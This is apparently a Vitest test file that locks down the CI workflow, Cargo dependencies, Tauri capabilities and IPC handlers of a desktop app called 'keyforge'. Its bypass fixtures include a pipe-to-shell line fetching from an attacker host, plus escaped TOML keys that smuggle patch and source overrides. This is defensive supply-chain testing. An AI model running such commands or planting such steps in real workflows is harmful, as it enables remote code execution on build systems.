import { execFileSync } from "node:child_process";
import { readdirSync, readFileSync } from "node:fs";
import { resolve } from "node:path";

import { expect, it } from "vitest";

type Capability = {
  permissions: unknown;
};

type CargoDependency = {
  features: string[];
  kind: string | null;
  name: string;
  optional: boolean;
  path: string | null;
  registry: string | null;
  rename: string | null;
  req: string;
  source: string | null;
  target: string | null;
  uses_default_features: boolean;
};

type CargoPackage = {
  dependencies: CargoDependency[];
  id: string;
  name: string;
};

type CargoMetadata = {
  packages: CargoPackage[];
  workspace_members: string[];
};

type WorkflowEntry = {
  indentation: number;
  key: string;
  line: number;
  value: string;
};

const REVIEWED_WORKFLOW_LINES = [
  "name: CI",
  "on:",
  "  push:",
  "    branches: [main]",
  "  pull_request:",
  "permissions:",
  "  contents: read",
  "env:",
  '  NEXT_TELEMETRY_DISABLED: "1"',
  "jobs:",
  "  frontend:",
  "    runs-on: ubuntu-24.04",
  "    steps:",
  "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
  "      - uses: pnpm/action-setup@f40ffcd9367d9f12939873eb1018b921a783ffaa",
  "        with:",
  "          run_install: false",
  "      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
  "        with:",
  "          node-version: 22.23.2",
  "          cache: pnpm",
  "      - run: pnpm install --frozen-lockfile",
  "      - run: pnpm test",
  "      - run: pnpm build",
  "  rust:",
  "    strategy:",
  "      fail-fast: false",
  "      matrix:",
  "        os: [ubuntu-24.04, macos-15, windows-2025]",
  "    runs-on: ${{ matrix.os }}",
  "    steps:",
  "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
  "      - name: Install Tauri Linux prerequisites",
  "        if: runner.os == 'Linux'",
  "        run: |",
  "          sudo apt-get update",
  "          sudo apt-get install --yes \\",
  "            build-essential \\",
  "            curl \\",
  "            file \\",
  "            libayatana-appindicator3-dev \\",
  "            libasound2-dev \\",
  "            librsvg2-dev \\",
  "            libssl-dev \\",
  "            libwebkit2gtk-4.1-dev \\",
  "            libxdo-dev \\",
  "            wget",
  "      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c",
  "        with:",
  "          toolchain: 1.88.0",
  "          components: rustfmt, clippy",
  "      - run: cargo metadata --locked --manifest-path src-tauri/Cargo.toml --no-deps --format-version 1",
  "      - if: runner.os == 'Linux'",
  "        run: cargo fmt --manifest-path src-tauri/Cargo.toml -- --check",
  "      - run: cargo clippy --locked --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings",
  "      - run: cargo test --locked --manifest-path src-tauri/Cargo.toml --all-targets",
];

const PROJECT_ROOT = process.cwd();
const ALLOWED_HANDLER = "tauri::generate_handler![commands::app_info::get_app_info]";
const ALLOWED_ACTIONS = [
  "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
  "pnpm/action-setup@f40ffcd9367d9f12939873eb1018b921a783ffaa",
  "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
  "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
  "dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c",
];
const CRATES_IO_SOURCE = "registry+https://github.com/rust-lang/crates.io-index";
const APPROVED_DEPENDENCIES = [
  {
    name: "cpal",
    rename: null,
    source: CRATES_IO_SOURCE,
    req: "^0.18.1",
    kind: null,
    optional: false,
    uses_default_features: false,
    features: [],
    target: null,
    registry: null,
    path: null,
  },
  {
    name: "crossbeam-queue",
    rename: null,
    source: CRATES_IO_SOURCE,
    req: "^0.3.13",
    kind: null,
    optional: false,
    uses_default_features: true,
    features: [],
    target: null,
    registry: null,
    path: null,
  },
  {
    name: "serde",
    rename: null,
    source: CRATES_IO_SOURCE,
    req: "^1.0",
    kind: null,
    optional: false,
    uses_default_features: true,
    features: ["derive"],
    target: null,
    registry: null,
    path: null,
  },
  {
    name: "tauri",
    rename: null,
    source: CRATES_IO_SOURCE,
    req: "^2.11.3",
    kind: null,
    optional: false,
    uses_default_features: true,
    features: [],
    target: null,
    registry: null,
    path: null,
  },
  {
    name: "tauri-build",
    rename: null,
    source: CRATES_IO_SOURCE,
    req: "^2.6.3",
    kind: "build",
    optional: false,
    uses_default_features: true,
    features: [],
    target: null,
    registry: null,
    path: null,
  },
];

function projectPath(path: string): string {
  return resolve(PROJECT_ROOT, path);
}

function read(path: string): string {
  return readFileSync(projectPath(path), "utf8");
}

function fail(message: string): never {
  throw new Error(message);
}

function assertEqual(actual: unknown, expected: unknown, message: string): void {
  if (JSON.stringify(actual) !== JSON.stringify(expected)) {
    fail(message);
  }
}

function filesWithExtensions(directory: string, extensions: string[]): string[] {
  const files: string[] = [];
  for (const entry of readdirSync(projectPath(directory), {
    withFileTypes: true,
  })) {
    const relativePath = `${directory}/${entry.name}`;
    if (entry.isDirectory()) {
      files.push(...filesWithExtensions(relativePath, extensions));
    } else if (entry.isFile() && extensions.some((extension) => entry.name.endsWith(extension))) {
      files.push(relativePath);
    }
  }
  return files.sort();
}

function cargoPolicySources(): Map<string, string> {
  const ignoredDirectories = new Set([".git", ".next", "node_modules", "out", "target"]);
  const sources = new Map<string, string>();
  const visit = (directory: string): void => {
    for (const entry of readdirSync(projectPath(directory), { withFileTypes: true })) {
      const path = directory === "." ? entry.name : `${directory}/${entry.name}`;
      if (entry.isDirectory()) {
        if (!ignoredDirectories.has(entry.name)) {
          visit(path);
        }
      } else if (
        entry.isFile() &&
        (entry.name === "Cargo.toml" || /(?:^|\/)\.cargo\/config[^/]*$/.test(path))
      ) {
        sources.set(path, read(path));
      }
    }
  };
  visit(".");
  return sources;
}

function stripTomlComment(line: string): string {
  let quote: '"' | "'" | null = null;
  let escaped = false;
  for (let index = 0; index < line.length; index += 1) {
    const character = line[index];
    if (quote === '"') {
      if (escaped) {
        escaped = false;
      } else if (character === "\\") {
        escaped = true;
      } else if (character === quote) {
        quote = null;
      }
    } else if (quote === "'") {
      if (character === quote) {
        quote = null;
      }
    } else if (character === '"' || character === "'") {
      quote = character;
    } else if (character === "#") {
      return line.slice(0, index);
    }
  }
  return line;
}

function decodeTomlBasicKey(value: string): string {
  let decoded = "";
  for (let index = 0; index < value.length; index += 1) {
    const character = value[index];
    if (character !== "\\") {
      decoded += character;
      continue;
    }
    const escape = value[index + 1];
    const simpleEscapes: Record<string, string> = {
      '"': '"',
      "\\": "\\",
      b: "\b",
      f: "\f",
      n: "\n",
      r: "\r",
      t: "\t",
    };
    if (escape in simpleEscapes) {
      decoded += simpleEscapes[escape];
      index += 1;
      continue;
    }
    if (escape === "u" || escape === "U") {
      const length = escape === "u" ? 4 : 8;
      const digits = value.slice(index + 2, index + 2 + length);
      if (!new RegExp(`^[0-9A-Fa-f]{${length}}$`).test(digits)) {
        fail("invalid Unicode escape in Cargo policy key");
      }
      const codePoint = Number.parseInt(digits, 16);
      try {
        decoded += String.fromCodePoint(codePoint);
      } catch {
        fail("invalid Unicode code point in Cargo policy key");
      }
      index += length + 1;
      continue;
    }
    fail("invalid escape in Cargo policy key");
  }
  return decoded;
}

function decodeTomlKeySegment(rawSegment: string): string {
  const segment = rawSegment.trim();
  if (segment.startsWith('"') && segment.endsWith('"')) {
    return decodeTomlBasicKey(segment.slice(1, -1));
  }
  if (segment.startsWith("'") && segment.endsWith("'")) {
    return segment.slice(1, -1);
  }
  if (!/^[A-Za-z0-9_-]+$/.test(segment)) {
    fail("invalid Cargo policy key");
  }
  return segment;
}

function splitTomlDottedKey(rawKey: string): string[] {
  const segments: string[] = [];
  let start = 0;
  let quote: '"' | "'" | null = null;
  let escaped = false;
  for (let index = 0; index < rawKey.length; index += 1) {
    const character = rawKey[index];
    if (quote === '"') {
      if (escaped) {
        escaped = false;
      } else if (character === "\\") {
        escaped = true;
      } else if (character === quote) {
        quote = null;
      }
    } else if (quote === "'") {
      if (character === quote) {
        quote = null;
      }
    } else if (character === '"' || character === "'") {
      quote = character;
    } else if (character === ".") {
      segments.push(decodeTomlKeySegment(rawKey.slice(start, index)));
      start = index + 1;
    }
  }
  if (quote !== null || escaped) {
    fail("unterminated Cargo policy key");
  }
  segments.push(decodeTomlKeySegment(rawKey.slice(start)));
  return segments;
}

function tomlTableKey(line: string): string[] | null {
  const trimmed = line.trim();
  const arrayTable = trimmed.startsWith("[[") && trimmed.endsWith("]]");
  const regularTable = trimmed.startsWith("[") && trimmed.endsWith("]");
  if (!arrayTable && !regularTable) {
    return null;
  }
  const boundary = arrayTable ? 2 : 1;
  return splitTomlDottedKey(trimmed.slice(boundary, -boundary));
}

function tomlAssignmentKey(line: string): string[] | null {
  let quote: '"' | "'" | null = null;
  let escaped = false;
  for (let index = 0; index < line.length; index += 1) {
    const character = line[index];
    if (quote === '"') {
      if (escaped) {
        escaped = false;
      } else if (character === "\\") {
        escaped = true;
      } else if (character === quote) {
        quote = null;
      }
    } else if (quote === "'") {
      if (character === quote) {
        quote = null;
      }
    } else if (character === '"' || character === "'") {
      quote = character;
    } else if (character === "=") {
      return splitTomlDottedKey(line.slice(0, index));
    }
  }
  return null;
}

function assertCargoSourcePolicy(sources: Map<string, string>): void {
  for (const [path, contents] of sources) {
    const isManifest = path === "Cargo.toml" || path.endsWith("/Cargo.toml");
    const isCargoConfig = /(?:^|\/)\.cargo\/config[^/]*$/.test(path);
    if (!isManifest && !isCargoConfig) {
      continue;
    }
    let currentTable: string[] = [];
    for (const rawLine of contents.replace(/\r\n?/g, "\n").split("\n")) {
      const line = stripTomlComment(rawLine).trim();
      if (line === "") {
        continue;
      }
      const table = tomlTableKey(line);
      if (table) {
        currentTable = table;
        if (isManifest && table[0] === "patch") {
          fail(`${path} contains an unapproved Cargo patch table`);
        }
        if (isManifest && table[0] === "replace") {
          fail(`${path} contains an unapproved Cargo replace table`);
        }
        if (isCargoConfig && table[0] === "source") {
          fail(`${path} contains an unapproved Cargo source override`);
        }
        continue;
      }
      const assignment = tomlAssignmentKey(line);
      if (
        isManifest &&
        currentTable.length === 0 &&
        assignment?.[0] === "patch"
      ) {
        fail(`${path} contains an unapproved Cargo patch assignment`);
      }
      if (
        isManifest &&
        currentTable.length === 0 &&
        assignment?.[0] === "replace"
      ) {
        fail(`${path} contains an unapproved Cargo replace assignment`);
      }
      if (
        isCargoConfig &&
        currentTable.length === 0 &&
        assignment?.[0] === "source"
      ) {
        fail(`${path} contains an unapproved Cargo source override`);
      }
    }
  }
}

function capabilitySources(): Map<string, string> {
  return new Map(
    filesWithExtensions("src-tauri/capabilities", [".json", ".toml"]).map(
      (path) => [path, read(path)],
    ),
  );
}

function assertCapabilityPolicy(sources: Map<string, string>): void {
  const paths = Array.from(sources.keys()).sort();
  if (paths.some((path) => path.endsWith(".toml"))) {
    fail("TOML capabilities are not reviewed");
  }
  assertEqual(
    paths,
    ["src-tauri/capabilities/main.json"],
    "capability files differ from the reviewed set",
  );
  for (const [path, contents] of sources) {
    const capability = JSON.parse(contents) as Capability;
    assertEqual(capability.permissions, [], `${path} grants permissions`);
  }
}

function rustSources(): Map<string, string> {
  return new Map(
    filesWithExtensions("src-tauri/src", [".rs"]).map((path) => [path, read(path)]),
  );
}

function assertNativeIpcPolicy(sources: Map<string, string>): void {
  const source = Array.from(sources.values()).join("\n");
  if (/\b(?:pub\s+)?use\s+[^;]*\bgenerate_handler\b[^;]*;/.test(source)) {
    fail("generate_handler imports and aliases are not allowed");
  }
  const macros = Array.from(source.matchAll(/\bgenerate_handler!\s*([\[\(\{])/g));
  if (macros.length !== 1) {
    fail("exactly one generate_handler macro is required");
  }
  if (macros[0][1] !== "[") {
    fail("generate_handler must use square brackets");
  }

  const normalized = source.replace(/\s+/g, "");
  const invocations = Array.from(
    normalized.matchAll(/\.invoke_handler\(([^)]*)\)/g),
    (match) => match[1],
  );
  if (invocations.length !== 1) {
    fail("exactly one invoke_handler registration is required");
  }
  if (invocations[0] !== ALLOWED_HANDLER) {
    fail("invoke_handler must register only the reviewed handler macro");
  }
}

function cargoMetadata(): CargoMetadata {
  return JSON.parse(
    execFileSync(
      "cargo",
      [
        "metadata",
        "--locked",
        "--manifest-path",
        "src-tauri/Cargo.toml",
        "--no-deps",
        "--format-version",
        "1",
      ],
      { cwd: PROJECT_ROOT, encoding: "utf8" },
    ),
  ) as CargoMetadata;
}

function normalizedDependencies(
  dependencies: CargoDependency[],
): Array<{
  features: string[];
  kind: string | null;
  name: string;
  optional: boolean;
  path: string | null;
  registry: string | null;
  rename: string | null;
  req: string;
  source: string | null;
  target: string | null;
  uses_default_features: boolean;
}> {
  return dependencies
    .map((dependency) => ({
      name: dependency.name,
      rename: dependency.rename,
      source: dependency.source,
      req: dependency.req,
      kind: dependency.kind,
      optional: dependency.optional,
      uses_default_features: dependency.uses_default_features,
      features: [...dependency.features].sort(),
      target: dependency.target,
      registry: dependency.registry,
      path: dependency.path ?? null,
    }))
    .sort((left, right) => left.name.localeCompare(right.name));
}

function assertCargoDependencyPolicy(dependencies: CargoDependency[]): void {
  assertEqual(
    normalizedDependencies(dependencies),
    normalizedDependencies(APPROVED_DEPENDENCIES),
    "Cargo dependencies differ from the approved complete records",
  );
}

function parseWorkflowEntry(line: string, lineNumber: number): WorkflowEntry | null {
  const uncommented = line.replace(/\s+#.*$/, "");
  const match = uncommented.match(
    /^(\s*)(?:-\s*)?(?:"([^"]+)"|'([^']+)'|([A-Za-z][A-Za-z0-9_-]*))\s*:\s*(.*?)\s*$/,
  );
  if (!match) {
    return null;
  }
  return {
    indentation: match[1].length,
    key: match[2] ?? match[3] ?? match[4],
    line: lineNumber,
    value: match[5],
  };
}

function assertReviewedWorkflowSyntax(workflow: string): void {
  const lines: string[] = [];
  let blockScalarIndentation: number | undefined;
  let pendingBlockBlankLines: string[] = [];
  for (const rawLine of workflow.replace(/\r\n?/g, "\n").split("\n")) {
    if (blockScalarIndentation !== undefined) {
      if (/^\s*$/.test(rawLine)) {
        pendingBlockBlankLines.push(rawLine);
        continue;
      }
      const indentation = rawLine.length - rawLine.trimStart().length;
      if (indentation > blockScalarIndentation) {
        lines.push(...pendingBlockBlankLines, rawLine);
        pendingBlockBlankLines = [];
        continue;
      }
      blockScalarIndentation = undefined;
      pendingBlockBlankLines = [];
    }

    const line = rawLine.trimEnd();
    const withoutComment = line.replace(/(?:^|\s+)#.*$/, "").trimEnd();
    if (withoutComment.trim() === "") {
      continue;
    }
    lines.push(withoutComment);
    if (withoutComment.endsWith("run: |")) {
      blockScalarIndentation =
        withoutComment.length - withoutComment.trimStart().length;
    }
  }
  const mismatch = lines.findIndex(
    (line, index) => line !== REVIEWED_WORKFLOW_LINES[index],
  );
  if (mismatch !== -1 || lines.length !== REVIEWED_WORKFLOW_LINES.length) {
    const differingLine =
      mismatch === -1
        ? Math.min(lines.length, REVIEWED_WORKFLOW_LINES.length)
        : mismatch;
    fail(
      `workflow differs from the reviewed snapshot on significant line ${differingLine + 1}`,
    );
  }
}

function workflowEntries(workflow: string): WorkflowEntry[] {
  const entries: WorkflowEntry[] = [];
  for (const [index, line] of workflow.replace(/\r\n?/g, "\n").split("\n").entries()) {
    const entry = parseWorkflowEntry(line, index);
    if (entry) {
      entries.push(entry);
    }
  }
  return entries;
}

function inlineList(value: string): string[] {
  const match = value.match(/^\[(.*)\]$/);
  if (!match) {
    fail("matrix OS values must use the reviewed inline list");
  }
  return match[1]
    .split(",")
    .map((item) => item.trim().replace(/^("|')|("|')$/g, ""));
}

function assertWorkflowPolicy(workflow: string): void {
  const normalized = workflow.replace(/\r\n?/g, "\n");
  assertReviewedWorkflowSyntax(normalized);
  const entries = workflowEntries(normalized);
  if (/\bsecrets\b/i.test(normalized)) {
    fail("workflow secrets are not allowed");
  }
  if (entries.some((entry) => entry.key === "continue-on-error")) {
    fail("continue-on-error is not allowed");
  }
  if (entries.some((entry) => entry.key === "include" || entry.key === "exclude")) {
    fail("matrix include and exclude entries are not allowed");
  }

  const jobs = entries.find((entry) => entry.key === "jobs" && entry.indentation === 0);
  if (!jobs) {
    fail("workflow must define jobs");
  }
  const nextTopLevelLine = entries.find(
    (entry) => entry.line > jobs.line && entry.indentation === 0,
  )?.line;
  const jobNames = entries
    .filter(
      (entry) =>
        entry.line > jobs.line &&
        entry.indentation === 2 &&
        (nextTopLevelLine === undefined || entry.line < nextTopLevelLine),
    )
    .map((entry) => entry.key);
  assertEqual(jobNames, ["frontend", "rust"], "workflow jobs differ from the reviewed set");

  const permissions = entries.filter((entry) => entry.key === "permissions");
  const rootPermissions = permissions.filter((entry) => entry.indentation === 0);
  assertEqual(rootPermissions.length, 1, "exactly one top-level permissions block is required");
  if (permissions.some((entry) => entry.indentation !== 0)) {
    fail("job-level permissions are not allowed");
  }
  if (rootPermissions[0].value !== "") {
    fail("permissions must not use write-all or inline permissions");
  }
  const permissionsEnd = entries.find(
    (entry) =>
      entry.line > rootPermissions[0].line && entry.indentation <= rootPermissions[0].indentation,
  )?.line;
  const permissionEntries = entries
    .filter(
      (entry) =>
        entry.line > rootPermissions[0].line &&
        entry.indentation === 2 &&
        (permissionsEnd === undefined || entry.line < permissionsEnd),
    )
    .map((entry) => [entry.key, entry.value]);
  assertEqual(permissionEntries, [["contents", "read"]], "permissions must be contents: read");

  const matrices = entries.filter((entry) => entry.key === "matrix");
  assertEqual(matrices.length, 1, "exactly one desktop matrix is required");
  const matrixOs = entries.filter((entry) => entry.key === "os");
  assertEqual(matrixOs.length, 1, "exactly one matrix OS entry is required");
  assertEqual(
    inlineList(matrixOs[0].value),
    ["ubuntu-24.04", "macos-15", "windows-2025"],
    "matrix OS values differ from the reviewed set",
  );
  if (
    !/^ {4}strategy:\n {6}fail-fast: false\n {6}matrix:\n {8}os: \[ubuntu-24\.04, macos-15, windows-2025\]\n {4}runs-on: \$\{\{ matrix\.os \}\}$/m.test(
      normalized,
    )
  ) {
    fail("desktop matrix and fail-fast policy differ from the reviewed form");
  }
  if (
    !/^ {6}- name: Install Tauri Linux prerequisites\n {8}if: runner\.os == 'Linux'\n {8}run: \|$/m.test(
      normalized,
    )
  ) {
    fail("Tauri prerequisites must be guarded by Linux");
  }
  if (
    !/^ {6}- if: runner\.os == 'Linux'\n {8}run: cargo fmt --manifest-path src-tauri\/Cargo\.toml -- --check$/m.test(
      normalized,
    )
  ) {
    fail("cargo fmt must be guarded by Linux");
  }

  const uses = entries.filter((entry) => entry.key === "uses");
  if (uses.some((entry) => entry.indentation <= 4)) {
    fail("reusable workflow jobs are not allowed");
  }
  const actionReferences = uses.map((entry) => entry.value.split(/\s+#/)[0]);
  assertEqual(actionReferences, ALLOWED_ACTIONS, "workflow actions differ from the pinned allowlist");
  if (
    actionReferences.some((reference) =>
      /(?:^|\/)(?:cache|upload-artifact|download-artifact)@/i.test(reference),
    )
  ) {
    fail("cache and artifact actions are not allowed");
  }

  const requiredLines = [
    '  NEXT_TELEMETRY_DISABLED: "1"',
    "          toolchain: 1.88.0",
    "            libasound2-dev \\",
    "      - run: cargo metadata --locked --manifest-path src-tauri/Cargo.toml --no-deps --format-version 1",
    "      - run: cargo clippy --locked --manifest-path src-tauri/Cargo.toml --all-targets -- -D warnings",
    "      - run: cargo test --locked --manifest-path src-tauri/Cargo.toml --all-targets",
  ];
  const lines = normalized.split("\n");
  for (const requiredLine of requiredLines) {
    if (!lines.includes(requiredLine)) {
      fail(`workflow is missing required line: ${requiredLine}`);
    }
  }
}

function approvedDependencyFixture(): CargoDependency[] {
  return APPROVED_DEPENDENCIES.map((dependency) => ({
    ...dependency,
    features: [...dependency.features],
  }));
}

function nativeIpcFixture(): Map<string, string> {
  return new Map([
    [
      "src-tauri/src/lib.rs",
      "tauri::Builder::default().invoke_handler(tauri::generate_handler![commands::app_info::get_app_info]);",
    ],
  ]);
}

it("keeps audio outside every Tauri IPC permission and handler surface", () => {
  assertCapabilityPolicy(capabilitySources());
  assertNativeIpcPolicy(rustSources());
});

it("rejects TOML capability fixtures", () => {
  const fixture = new Map([
    ["src-tauri/capabilities/main.json", '{"permissions":[]}'],
    ["src-tauri/capabilities/extra.toml", "permissions = []"],
  ]);
  expect(() => assertCapabilityPolicy(fixture)).toThrow("TOML capabilities");
});

it("rejects alternate and extra native handler fixtures", () => {
  const extraMacro = nativeIpcFixture();
  extraMacro.set(
    "src-tauri/src/extra.rs",
    "tauri::generate_handler![commands::app_info::get_app_info];",
  );
  expect(() => assertNativeIpcPolicy(extraMacro)).toThrow("exactly one generate_handler");

  const alternateDelimiter = nativeIpcFixture();
  alternateDelimiter.set(
    "src-tauri/src/lib.rs",
    "tauri::Builder::default().invoke_handler(tauri::generate_handler!(commands::app_info::get_app_info));",
  );
  expect(() => assertNativeIpcPolicy(alternateDelimiter)).toThrow("square brackets");

  const curlyDelimiter = nativeIpcFixture();
  curlyDelimiter.set(
    "src-tauri/src/lib.rs",
    "tauri::Builder::default().invoke_handler(tauri::generate_handler!{commands::app_info::get_app_info});",
  );
  expect(() => assertNativeIpcPolicy(curlyDelimiter)).toThrow("square brackets");

  const alias = nativeIpcFixture();
  alias.set(
    "src-tauri/src/lib.rs",
    "use tauri::generate_handler as app_handler; tauri::Builder::default().invoke_handler(tauri::generate_handler![commands::app_info::get_app_info]);",
  );
  expect(() => assertNativeIpcPolicy(alias)).toThrow("imports and aliases");

  const differentMacro = nativeIpcFixture();
  differentMacro.set(
    "src-tauri/src/lib.rs",
    "tauri::Builder::default().invoke_handler(other::generate_handler![commands::app_info::get_app_info]);",
  );
  expect(() => assertNativeIpcPolicy(differentMacro)).toThrow("reviewed handler macro");
});

it("uses exactly the approved complete direct dependency records", () => {
  assertCargoSourcePolicy(cargoPolicySources());
  const metadata = cargoMetadata();
  const keyforge = metadata.packages.find(
    (candidate) =>
      candidate.name === "keyforge" &&
      metadata.workspace_members.includes(candidate.id),
  );
  expect(keyforge).toBeDefined();
  assertCargoDependencyPolicy(keyforge!.dependencies);
});

it("rejects Cargo dependency aliases, additions, and feature mutations", () => {
  const alias = approvedDependencyFixture();
  alias[0].rename = "audio";
  expect(() => assertCargoDependencyPolicy(alias)).toThrow("complete records");

  const addition = approvedDependencyFixture();
  addition.push({
    name: "reqwest",
    rename: null,
    source: CRATES_IO_SOURCE,
    req: "^0.12.0",
    kind: "dev",
    optional: false,
    uses_default_features: true,
    features: [],
    target: null,
    registry: null,
    path: null,
  });
  expect(() => assertCargoDependencyPolicy(addition)).toThrow("complete records");

  const featureChange = approvedDependencyFixture();
  featureChange[3].features.push("devtools");
  expect(() => assertCargoDependencyPolicy(featureChange)).toThrow("complete records");
});

it("rejects local path dependency origins", () => {
  const localPath = approvedDependencyFixture();
  localPath[0].source = null;
  localPath[0].path = "../local-cpal";

  expect(() => assertCargoDependencyPolicy(localPath)).toThrow("complete records");
});

it("rejects alternate dependency sources registries and targets", () => {
  const alternateSource = approvedDependencyFixture();
  alternateSource[0].source = "git+https://example.invalid/cpal";
  expect(() => assertCargoDependencyPolicy(alternateSource)).toThrow("complete records");

  const alternateRegistry = approvedDependencyFixture();
  alternateRegistry[0].registry = "private";
  expect(() => assertCargoDependencyPolicy(alternateRegistry)).toThrow("complete records");

  const targetSpecific = approvedDependencyFixture();
  targetSpecific[0].target = "cfg(target_os = \"macos\")";
  expect(() => assertCargoDependencyPolicy(targetSpecific)).toThrow("complete records");
});

it("rejects Cargo patch and replace tables from pure fixtures", () => {
  const patch = new Map([
    [
      "src-tauri/Cargo.toml",
      '["pa\\u0074ch".crates-io]\ncpal = { path = "../local-cpal" }\n',
    ],
  ]);
  expect(() => assertCargoSourcePolicy(patch)).toThrow("patch");

  const replacement = new Map([
    [
      "src-tauri/Cargo.toml",
      "[ 'replace' ]\n\"cpal:0.18.1\" = { path = '../local-cpal' }\n",
    ],
  ]);
  expect(() => assertCargoSourcePolicy(replacement)).toThrow("replace");

  const dottedPatch = new Map([
    [
      "src-tauri/Cargo.toml",
      'patch.crates-io.cpal = { path = "../local-cpal" }\n',
    ],
  ]);
  expect(() => assertCargoSourcePolicy(dottedPatch)).toThrow("patch");

  const inlineReplace = new Map([
    [
      "src-tauri/Cargo.toml",
      'replace = { "cpal:0.18.1" = { path = "../local-cpal" } }\n',
    ],
  ]);
  expect(() => assertCargoSourcePolicy(inlineReplace)).toThrow("replace");
});

it("rejects repository Cargo source replacement configs from pure fixtures", () => {
  const sourceTable = new Map([
    [
      ".cargo/config.toml",
      '["so\\u0075rce".crates-io]\nreplace-with = "vendored"\n',
    ],
  ]);
  expect(() => assertCargoSourcePolicy(sourceTable)).toThrow("source override");

  const dottedSource = new Map([
    [
      "src-tauri/.cargo/config.local",
      'source.crates-io.replace-with = "vendored"\n',
    ],
  ]);
  expect(() => assertCargoSourcePolicy(dottedSource)).toThrow("source override");
});

it("keeps desktop CI immutable and fail-closed", () => {
  assertWorkflowPolicy(read(".github/workflows/ci.yml"));
});

it("accepts reviewed workflow line-ending normalization", () => {
  const workflow = read(".github/workflows/ci.yml");
  expect(() => assertWorkflowPolicy(workflow.replace(/\n/g, "\r\n"))).not.toThrow();
  expect(() => assertWorkflowPolicy(workflow.replace(/\n/g, "\r"))).not.toThrow();
});

it("rejects workflow bypass fixtures", () => {
  const workflow = read(".github/workflows/ci.yml");
  const namedAction = workflow.replace(
    "      - run: pnpm build",
    "      - run: pnpm build\n      - name: Cache dependencies\n        uses: actions/cache@0000000000000000000000000000000000000000",
  );
  expect(() => assertWorkflowPolicy(namedAction)).toThrow();

  const reusableJob = workflow.replace(
    "    steps:\n",
    "    uses: owner/reusable-workflow@0000000000000000000000000000000000000000\n    steps:\n",
  );
  expect(() => assertWorkflowPolicy(reusableJob)).toThrow();

  const jobPermissions = workflow.replace(
    "    steps:\n",
    "    permissions: write-all\n    steps:\n",
  );
  expect(() => assertWorkflowPolicy(jobPermissions)).toThrow();

  const quotedContinue = workflow.replace(
    "      - run: pnpm build",
    '      - run: pnpm build\n      "continue-on-error": "true"',
  );
  expect(() => assertWorkflowPolicy(quotedContinue)).toThrow();

  const extraJob = `${workflow}\n  extra:\n    runs-on: ubuntu-24.04\n    steps: []\n`;
  expect(() => assertWorkflowPolicy(extraJob)).toThrow();

  const extraMatrixOs = workflow.replace(
    "os: [ubuntu-24.04, macos-15, windows-2025]",
    "os: [ubuntu-24.04, macos-15, windows-2025, freebsd-14]",
  );
  expect(() => assertWorkflowPolicy(extraMatrixOs)).toThrow();
});

it("rejects additional valid job IDs that the former reader ignored", () => {
  const workflow = `${read(".github/workflows/ci.yml")}\n  _extra:\n    runs-on: ubuntu-24.04\n    steps: []\n`;
  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects flow-style action steps that the former reader ignored", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "      - run: pnpm build",
    "      - run: pnpm build\n      - { uses: actions/cache@0000000000000000000000000000000000000000 }",
  );
  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects recombined reviewed step lines with an unreviewed shell body", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c # stable",
    "      - name: Install Tauri Linux prerequisites\n        if: runner.os == 'Linux'\n        run: |\n          curl https://attacker.invalid | sh\n\n      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c # stable",
  );

  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects duplicate reviewed workflow steps", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "      - run: pnpm test",
    "      - run: pnpm test\n      - run: pnpm test",
  );

  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects reordered reviewed workflow steps", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "      - run: pnpm test\n      - run: pnpm build",
    "      - run: pnpm build\n      - run: pnpm test",
  );

  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects comments inserted into the reviewed shell block", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "            curl \\\n            file \\",
    "            curl \\\n            # breaks the continued apt command\n            file \\",
  );

  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects trailing whitespace after a reviewed shell continuation", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "          sudo apt-get install --yes \\",
    "          sudo apt-get install --yes \\   ",
  );

  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects quoted escaped continue-on-error keys that the former reader ignored", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "      - run: pnpm build",
    '      - run: pnpm build\n      "continue\\u002don\\u002derror": true',
  );
  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("rejects quoted escaped job permissions that the former reader ignored", () => {
  const workflow = read(".github/workflows/ci.yml").replace(
    "    steps:\n",
    '    "permissi\\u006fns": write-all\n    steps:\n',
  );
  expect(() => assertWorkflowPolicy(workflow)).toThrow();
});

it("documents M2 startup and later ownership exclusions", () => {
  const readme = read("README.md");
  expect(readme).toContain(
    "`AudioEngine` is not constructed during ordinary Tauri startup in Milestone 2.",
  );
  expect(readme).toContain("Milestone 3 owns sound-pack loading and decoding.");
  expect(readme).toContain("Milestone 4 owns sanitized input integration.");
  expect(readme).toContain("Milestone 6 owns product UI and persistent volume.");
});
